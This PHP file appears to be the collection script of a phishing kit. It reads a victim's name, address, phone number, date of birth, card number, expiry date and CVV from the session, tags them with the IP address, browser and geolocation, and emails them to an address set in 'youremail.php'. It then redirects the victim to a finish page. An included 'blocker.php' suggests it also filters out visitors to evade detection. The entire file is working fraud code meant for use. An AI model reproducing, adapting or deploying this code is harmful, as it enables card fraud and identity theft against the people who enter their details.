<?php
	session_start();
    include './youremail.php';
	include './blocker.php';
    
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));

    $country = $dump["geoplugin_countryName"];
	$cn = $_SESSION['CN'];
	$fn = $_SESSION['FN'];
	
    $subject = 'PC allINFO [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|============ PC Info ===========|'."\r\n";
    $message .= '|Full Name:  '.$_SESSION['FN']."\r\n";
	$message .= '|Full Name:  '.$_SESSION['AD']."\r\n";
	$message .= '|Phone Number:  '.$_SESSION['PN']."\r\n";
    $message .= '|Date of Birth:  '.$_SESSION['DB']."\r\n";
    $message .= '|============ Card Info ===========|'."\r\n";
	$message .= '|Card Number:  '.$_SESSION['CN']."\r\n";
    $message .= '|Exp. Date  '.$_SESSION['ED']."\r\n";
	$message .= '|Cvv:  '.$_SESSION['CV']."\r\n";
    $message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";

		if (strlen($cn) <= 16 && $cn != "" && $fn != "" && strlen($fn)<=22 ){
		
	mail($to, $subject, $message);
	}
    header("Location: finalmsg.html");
 ?>